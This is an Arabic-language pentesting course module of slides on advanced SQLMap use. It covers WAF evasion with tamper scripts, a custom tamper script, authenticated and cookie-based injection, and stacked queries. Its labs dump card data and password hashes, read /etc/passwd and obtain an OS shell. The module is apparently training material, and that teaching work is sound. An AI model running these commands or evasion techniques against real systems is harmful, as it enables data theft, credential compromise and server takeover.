# 🎓 الجزء السادس: SQLMap المتقدمة + Labs عملية
## Slides 105 → 121

---

## 📌 Slide 105: SQLMap Advanced Techniques
### عنوان القسم: تقنيات SQLMap المتقدمة

دلوقتي خلصنا الأساسيات — هندخل في **الاستخدام المتقدم** لـ SQLMap! 🔥

> المستوى ده بيفرّق بين واحد بيستخدم SQLMap كـ Script Kiddie وبين واحد بيستخدمها كـ **Professional Pentester**.

---

## 📌 Slide 106: SQLMap - WAF Detection & Evasion

### اكتشاف وتجاوز الـ WAF:

> **WAF (Web Application Firewall)** هو جدار حماية بيراقب ويحجب الـ HTTP Requests المشبوهة. معظم المواقع الكبيرة عندها WAF.

```bash
# اكتشاف وجود WAF:
sqlmap -u URL --identify-waf

# تجاوز WAF باستخدام Tamper Scripts:
sqlmap -u URL --tamper=space2comment,between,randomcase

# تجاوز WAF بتغيير الـ User-Agent:
sqlmap -u URL --random-agent

# تجاوز WAF بإبطاء الطلبات:
sqlmap -u URL --delay=2 --safe-freq=3
```

### استراتيجيات التجاوز:

```mermaid
flowchart TD
    A["🛡️ WAF Detected!"] --> B{"ما نوع الـ WAF?"}
    B -->|CloudFlare| C["tamper: between,randomcase<br/>+ --random-agent"]
    B -->|ModSecurity| D["tamper: space2comment,charencode<br/>+ --delay=2"]
    B -->|AWS WAF| E["tamper: space2hash,base64encode<br/>+ custom headers"]
    B -->|Unknown| F["جرب كل الـ Tampers<br/>+ --identify-waf"]
    
    C --> G["✅ Bypass!"]
    D --> G
    E --> G
    F --> G
    
    style A fill:#ff4444,stroke:#cc0000,color:#fff
    style G fill:#44aa44,stroke:#228822,color:#fff
```

---

## 📌 Slide 107: SQLMap - Tamper Scripts Deep Dive

### شرح تفصيلي لأهم الـ Tamper Scripts:

| Script | ماذا يفعل | مثال |
|--------|----------|-------|
| `space2comment` | `SELECT * FROM` → `SELECT/**/*/FROM` | بيستبدل المسافات بتعليقات |
| `between` | `AND 5>3` → `AND 5 NOT BETWEEN 0 AND 3` | بيتجنب `>` و `<` |
| `randomcase` | `SELECT` → `SeLeCt` | بيعمل Random Case |
| `charencode` | `SELECT` → `%53%45%4C%45%43%54` | URL Encoding |
| `chardoubleencode` | Double URL Encoding | لـ WAFs بتعمل Decode مرة واحدة |
| `space2hash` | مسافة → `%23\n` | MySQL specific |
| `equaltolike` | `=` → `LIKE` | بيتجنب فلترة `=` |
| `greatest` | `>` → `GREATEST(a,b)=a` | بيتجنب `>` |
| `apostrophemask` | `'` → `%EF%BC%87` | Unicode Quote |

### إنشاء Tamper Script مخصص:
```python
#!/usr/bin/env python
# custom_tamper.py

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Custom tamper: يستبدل UNION بحروف Unicode
    """
    return payload.replace("UNION", "UN%49ON")
```

```bash
# استخدام الـ Custom Tamper:
sqlmap -u URL --tamper=custom_tamper
```

---

## 📌 Slide 108: SQLMap - Handling Authentication

### التعامل مع التطبيقات المحمية:

```bash
# Basic Authentication:
sqlmap -u URL --auth-type=Basic --auth-cred="admin:password123"

# Digest Authentication:
sqlmap -u URL --auth-type=Digest --auth-cred="admin:password123"

# Cookie-based Authentication:
sqlmap -u URL --cookie="PHPSESSID=abc123; token=xyz789"

# Form-based Login (SQLMap بيسجل دخول أوتوماتيك):
sqlmap -u URL --forms --batch

# Custom Authorization Header:
sqlmap -u URL --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..."
```

> **🔴 من واقع الـ Pentesting:** أكتر مشكلة بتواجه الناس مع SQLMap هي الـ **Session expiration**. التطبيق بيعمل Logout وSQLMap بتفتكر إنها لسه شغالة. الحل: استخدم `--safe-url` و `--safe-freq` عشان SQLMap تعمل Request عادي كل شوية تحافظ على الـ Session.

```bash
# الحفاظ على الـ Session:
sqlmap -u URL \
  --cookie="PHPSESSID=abc123" \
  --safe-url="http://target.com/dashboard.php" \
  --safe-freq=5
```

---

## 📌 Slide 109: SQLMap - Second-Order SQLi

### SQLMap والـ Second-Order Injection:

> **Second-Order SQLi** هو لما الـ Payload **بيتخزن** في الداتابيز الأول، وبيتنفذ **لاحقاً** لما حد تاني بيستخدم البيانات.

```bash
# التحديد:
sqlmap -u "http://target.com/register.php" \
  --data="username=test&password=pass" \
  --second-url="http://target.com/profile.php" \
  --batch
```

### الرؤية:

```mermaid
sequenceDiagram
    participant A as 🔴 Attacker
    participant W as 🌐 Web App
    participant D as 🗄️ Database
    
    A->>W: 1. Register: username = "admin'--"
    W->>D: 2. INSERT into users (stored safely!)
    Note over D: الـ Payload متخزن بس مش متنفذ
    
    A->>W: 3. View Profile page
    W->>D: 4. SELECT * FROM users WHERE name='admin'--'
    Note over D: 💥 الـ Payload اتنفذ هنا!
    D-->>W: 5. خطأ أو بيانات مسربة
    W-->>A: 6. النتيجة!
```

---

## 📌 Slide 110: SQLMap - Stacked Queries

### الاستعلامات المتراكبة (Stacked Queries):

> **Stacked Queries** = تنفيذ **أكتر من أمر SQL** في نفس الوقت باستخدام `;`

```sql
-- مثال: الاستعلام الأصلي + أمر إضافي
SELECT * FROM users WHERE id=1; DROP TABLE users; --
                              ↑ فاصلة منقوطة
                              ↑ بتبدأ أمر جديد!
```

```bash
# SQLMap بتدعم Stacked Queries:
sqlmap -u URL --technique=S

# مثال: إنشاء يوزر جديد في الداتابيز
sqlmap -u URL --sql-query="INSERT INTO users VALUES(999,'hacker','hacked')"
```

### متى بتشتغل Stacked Queries؟

| الداتابيز | بتدعم Stacked? | ملاحظات |
|-----------|---------------|---------|
| **MSSQL** | ✅ نعم | بتدعمها بشكل كامل |
| **PostgreSQL** | ✅ نعم | بتدعمها |
| **MySQL** | ⚠️ جزئياً | بتعتمد على الـ API (MySQLi بتدعم، PDO لأ) |
| **Oracle** | ❌ لا | مش بتدعم في معظم الحالات |

---

## 📌 Slide 111: Lab 1 - Error-Based SQLi with SQLMap

### المعمل الأول: Error-Based SQLi

**الهدف:** استخدام SQLMap لاكتشاف واستغلال Error-Based SQLi واستخراج البيانات.

```bash
# Step 1: الاكتشاف
sqlmap -u "http://lab.com/product.php?id=1" --batch

# Step 2: الداتابيزات
sqlmap -u "http://lab.com/product.php?id=1" --dbs --batch
# [*] store_db
# [*] information_schema

# Step 3: الجداول
sqlmap -u "http://lab.com/product.php?id=1" -D store_db --tables --batch
# [*] products
# [*] customers
# [*] credit_cards

# Step 4: سحب البيانات الحساسة
sqlmap -u "http://lab.com/product.php?id=1" \
  -D store_db -T credit_cards --dump --batch
```

---

## 📌 Slide 112: Lab 1 - Results Analysis

### تحليل نتائج المعمل الأول:

```
+----+------------------+------------+-----+
| id | card_number      | expiry     | cvv |
+----+------------------+------------+-----+
| 1  | 4111111111111111 | 12/2027    | 123 |
| 2  | 5500000000000004 | 06/2026    | 456 |
| 3  | 340000000000009  | 03/2028    | 789 |
+----+------------------+------------+-----+
```

### النقاط المستفادة:
- ✅ SQLMap اكتشف الثغرة **تلقائي** بدون تدخل
- ✅ حدد نوع الـ SQLi: Error-Based
- ✅ حدد نوع الداتابيز: MySQL 5.7
- ✅ سحب بيانات حساسة (أرقام بطاقات!)

> **💡 في التقرير:** ده يتصنف **Critical** — سرقة بيانات مالية حساسة!

---

## 📌 Slide 113: Lab 2 - Blind SQLi with SQLMap

### المعمل الثاني: Blind SQLi

**الهدف:** استغلال Blind SQLi (التطبيق مش بيعرض Errors).

```bash
# Step 1: الاكتشاف مع Level عالي
sqlmap -u "http://lab.com/search.php?q=test" \
  --level=3 --risk=2 --batch

# SQLMap هيكتشف:
# [INFO] GET parameter 'q' is vulnerable
# Type: boolean-based blind
# Type: time-based blind

# Step 2: استخراج البيانات (هياخد وقت أطول)
sqlmap -u "http://lab.com/search.php?q=test" \
  --dbs --batch --threads=10

# Step 3: سحب الـ Users
sqlmap -u "http://lab.com/search.php?q=test" \
  -D app_db -T users -C "username,password" --dump \
  --batch --threads=10
```

---

## 📌 Slide 114: Lab 2 - Blind SQLi Results

### تحليل النتائج:

```
[INFO] retrieved: admin
[INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[INFO] retrieved: john
[INFO] retrieved: e99a18c428cb38d5f260853678922e03

recognized possible password hashes:
+--------+-------------------------------------------+----------+
| user   | password                                  | cracked  |
+--------+-------------------------------------------+----------+
| admin  | 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)    | password |
| john   | e99a18c428cb38d5f260853678922e03 (MD5)    | abc123   |
+--------+-------------------------------------------+----------+
```

### أدلة إضافية على الخطورة:
```bash
# التحقق من صلاحيات DBA:
sqlmap -u URL --is-dba --batch
# current user is DBA: True

# قراءة ملفات:
sqlmap -u URL --file-read="/etc/passwd" --batch
# ✅ تم قراءة الملف!

# OS Shell:
sqlmap -u URL --os-shell --batch
# os-shell> whoami → www-data
```

---

## 📌 Slide 115: Lab 3 - POST-Based SQLi

### المعمل الثالث: SQLi في POST Request

**السيناريو:** فورم Login بيبعت POST Request.

```bash
# Step 1: اعتراض الـ Request من Burp وحفظه:
# POST /login.php HTTP/1.1
# Host: lab.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: PHPSESSID=abc123
#
# username=admin&password=test

# Step 2: SQLMap مع ملف الـ Request:
sqlmap -r login_request.txt -p username --batch

# Step 3: استغلال:
sqlmap -r login_request.txt -p username \
  --dbs --batch --technique=BEUST
```

---

## 📌 Slide 116: Lab 3 - POST-Based Results

### نتائج المعمل الثالث:

```bash
# SQLMap اكتشف:
# POST parameter 'username' is vulnerable
# Type: error-based
# Type: boolean-based blind
# Type: UNION query (3 columns)

# سحب البيانات:
sqlmap -r login_request.txt -p username \
  -D webapp -T admin_users --dump --batch

# +----+----------+----------------------------------+-------+
# | id | username | password                         | role  |
# +----+----------+----------------------------------+-------+
# | 1  | admin    | 21232f297a57a5a743894a0e4a801fc3 | admin |
# | 2  | editor   | 098f6bcd4621d373cade4e832627b4f6 | user  |
# +----+----------+----------------------------------+-------+
```

---

## 📌 Slide 117: Lab 4 - SQLi with Cookie Parameters

### المعمل الرابع: SQLi في الـ Cookies

**السيناريو:** الثغرة مش في URL أو Form — في **Cookie**!

```bash
# Step 1: معرفة إن الـ Cookie injectable:
sqlmap -u "http://lab.com/dashboard.php" \
  --cookie="user_id=5" \
  -p user_id \
  --level=2 \
  --batch

# --level=2 ضروري عشان SQLMap يختبر الـ Cookies!

# Step 2: استغلال:
sqlmap -u "http://lab.com/dashboard.php" \
  --cookie="user_id=5" \
  -p user_id \
  --dbs --batch
```

> **🔴 من واقع الـ Pentesting:** ثغرات الـ Cookie injection بتتنسي كتير! معظم الـ Pentesters بيختبروا الـ URL و Forms بس. **Level 2+** في SQLMap بيغطي الـ Cookies، و Level 3+ بيغطي الـ Headers كمان!

---

## 📌 Slide 118: Lab 5 - WAF Bypass with SQLMap

### المعمل الخامس: تجاوز WAF

**السيناريو:** الموقع محمي بـ WAF — SQLMap العادي بيتحجب.

```bash
# Step 1: اكتشاف الـ WAF:
sqlmap -u URL --identify-waf
# [INFO] identified WAF: ModSecurity

# Step 2: تجاوز بـ Tamper Scripts:
sqlmap -u URL \
  --tamper=space2comment,between,randomcase \
  --random-agent \
  --delay=1 \
  --batch \
  --dbs

# Step 3: لو لسه بيتحجب — جرب Tampers تانية:
sqlmap -u URL \
  --tamper=charencode,chardoubleencode,apostrophemask \
  --random-agent \
  --delay=2 \
  --safe-freq=3 \
  --safe-url="http://target.com/" \
  --batch \
  --dbs
```

---

## 📌 Slide 119: SQLMap Best Practices

### أفضل الممارسات:

| الممارسة | الشرح |
|----------|-------|
| **ابدأ يدوي** | أكّد الثغرة يدوي الأول قبل ما تستخدم SQLMap |
| **استخدم -r** | ملف Request من Burp أدق من -u |
| **--batch** | دايماً استخدمه عشان تتجنب التوقفات |
| **--proxy** | مرّر عبر Burp عشان تشوف الـ Requests |
| **--threads** | استخدم 5-10 threads (مش أكتر عشان متسقّطش السيرفر) |
| **--technique** | حدد التقنية المطلوبة بدل ما تجرب كلهم |
| **--tamper** | استخدمه بس لو فيه WAF |
| **--flush-session** | امسح الـ Session لو عايز تبدأ من الأول |
| **--output-dir** | حدد مكان حفظ النتائج |

---

## 📌 Slide 120: SQLMap Cheat Sheet

### ملخص الأوامر المرجعي:

```bash
# === الأساسيات ===
sqlmap -u "URL?param=value"              # اختبار أساسي
sqlmap -r request.txt                     # من ملف Burp
sqlmap -u URL --dbs                       # عرض الداتابيزات
sqlmap -u URL -D db --tables              # عرض الجداول
sqlmap -u URL -D db -T tbl --columns      # عرض الأعمدة
sqlmap -u URL -D db -T tbl --dump         # سحب البيانات

# === متقدم ===
sqlmap -u URL --os-shell                  # Shell على السيرفر
sqlmap -u URL --file-read="/etc/passwd"   # قراءة ملف
sqlmap -u URL --is-dba                    # هل root?
sqlmap -u URL --passwords                 # هاشات الباسوردات

# === التحسين ===
sqlmap -u URL --batch --threads=10        # سريع وتلقائي
sqlmap -u URL --level=5 --risk=3          # اختبار شامل
sqlmap -u URL --tamper=SCRIPT             # تجاوز WAF
sqlmap -u URL --random-agent              # User-Agent عشوائي

# === الحفاظ على الـ Session ===
sqlmap -u URL --safe-url=URL2 --safe-freq=5
sqlmap -u URL --flush-session             # بداية جديدة
```

---

## 📌 Slide 121: Demo - Complete SQLMap Workflow

### ديمو كامل: من الاكتشاف لحد الـ Shell

```bash
# === Phase 1: الاكتشاف ===
sqlmap -r request.txt --batch --level=3
# [✅] GET parameter 'id' is vulnerable

# === Phase 2: الاستكشاف ===
sqlmap -r request.txt --dbs --batch
# [*] webapp_db
sqlmap -r request.txt -D webapp_db --tables --batch
# [*] users, orders, payments
sqlmap -r request.txt -D webapp_db -T users --dump --batch
# [*] admin:hash, user1:hash, user2:hash

# === Phase 3: التصعيد ===
sqlmap -r request.txt --is-dba --batch
# [✅] current user is DBA: True
sqlmap -r request.txt --os-shell --batch
# os-shell> whoami
# www-data
# os-shell> cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash

# === Phase 4: التوثيق ===
# 1. Screenshot لكل خطوة
# 2. حفظ Output في ملفات
# 3. كتابة التقرير مع:
#    - Impact: Critical
#    - CVSS: 9.8
#    - Remediation: Parameterized Queries
```

> **🔴 من واقع الـ Pentesting:** عملية كاملة — من Parameter عادي لحد Shell على السيرفر. ده بيحصل في Pentests حقيقية، مش بس في Labs!

---

## 🎯 ملخص الجزء السادس

| الموضوع | الشرح | الأهمية |
|---------|-------|---------|
| **WAF Evasion** | Tamper Scripts لتجاوز الحمايات | مهم في Real-world targets |
| **Tamper Scripts** | تعديل Payloads تلقائي | space2comment, randomcase, charencode |
| **Authentication** | التعامل مع Login-protected apps | `-r` + `--cookie` + `--safe-url` |
| **Stacked Queries** | تنفيذ أكتر من أمر SQL | خطيرة جداً — INSERT, UPDATE, DELETE |
| **Lab Practice** | 5 Labs تطبيقية | من Error-Based لحد WAF Bypass |

### 🔧 أهم الـ Key Takeaways:

```
✅ SQLMap ليها حلول لكل سيناريو — أنت بس محتاج تعرف الـ Flags
✅ Tamper Scripts أساسية لتجاوز WAF
✅ دايماً ابدأ يدوي وبعدين سلّم SQLMap
✅ -r أفضل من -u دايماً
✅ --level=3+ عشان تختبر Cookies و Headers
✅ لو is-dba = True → جرب --os-shell!
```

> 📝 **الجزء الجاي:** هندخل في **Out-of-Band (OOB) SQLi** و **Second-Order SQLi** — تقنيات متقدمة بتتخطى كل الحمايات! 🛠️
